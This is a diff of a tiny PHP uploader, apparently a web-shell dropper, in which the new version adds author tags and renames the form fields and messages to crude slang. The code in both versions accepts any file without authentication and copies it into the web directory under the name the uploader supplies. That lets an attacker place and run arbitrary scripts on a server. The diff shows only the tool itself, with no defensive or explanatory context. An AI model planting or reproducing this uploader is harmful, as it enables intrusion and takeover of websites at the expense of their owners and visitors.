@@ -1,8 +1,11 @@
-<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>
-<?php if($_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {
-  echo '<b>Upload Success</b>';
+<!-- Unknown45 -->
+<!-- https://github.com/whoami-45 -->
+
+<form action="" method="post" enctype="multipart/form-data" name="memek" id="memek"><input type="file" name="file" size="50"><input name="meki" type="submit" id="meki" value="Crot"></form>
+<?php if($_POST['meki']=="Crot"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {
+  echo '<b>Oke</b>';
 }
 else { 
-  echo '<b>Upload Failed</b>';}
+  echo '<b>Ups</b>';}
 }
 ?>
